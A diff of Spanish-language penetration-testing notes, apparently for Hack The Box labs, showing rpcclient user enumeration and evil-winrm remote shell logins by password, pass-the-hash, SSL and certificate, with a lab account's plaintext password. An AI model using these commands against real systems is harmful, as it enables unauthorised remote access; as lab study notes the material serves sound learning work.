@@ -1,14 +1,20 @@
-// En caso de haber adquirido unas credenciales a traves de Password_Sprying, podriamos comprobar si este usuario es del grupo Remote Management User
-// Para esto deberemos de buscar a nuestro usuario por su rid y ver a que grupo pertenece
+[*] En caso de haber adquirido unas credenciales a traves de Password_Sprying, podriamos comprobar si este usuario es del grupo Remote Management User
+[*] Para esto deberemos de buscar a nuestro usuario por su rid y ver a que grupo pertenece
 
-Comando -> rpcclient -U "" 10.10.10.169 -N -c "queryuser 0x2775"
+[*] Gracias a esto podremos conectarnos con evil-winrm por el puerto 5985
 
-// Gracias a esto podremos conectarnos con evil-winrm por el puerto 5985
+	~$> rpcclient -U "" 10.10.10.169 -N -c "queryuser 0x2775"
 
-[Lo hacemos cuando sabemos que las credenciales que tenemos tienen privilegios para poder tener una shell interactiva]
+[!] Lo hacemos cuando sabemos que las credenciales que tenemos tienen privilegios para poder tener una shell interactiva]
 
-#Login con Password
-evil-winrm -i 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
+[*] Login con Password
+	~$> evil-winrm -i 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
 
-#Login con Hash
-evil-winrm -i 10.10.10.193 -u 'svc-print' -H 'HASH'
+[*] Login con Hash
+	~$> evil-winrm -i 10.10.10.193 -u 'svc-print' -H 'HASH'
+
+[*] Accediendo desde la 5986 que es con ssl
+	~$> evil-winrm -i 10.10.11.152 -S
+
+[*] Accediendo con public y private key
+	~$> evil-winrm -i 10.10.11.152 -c certificate.pem -k priv-key.pem
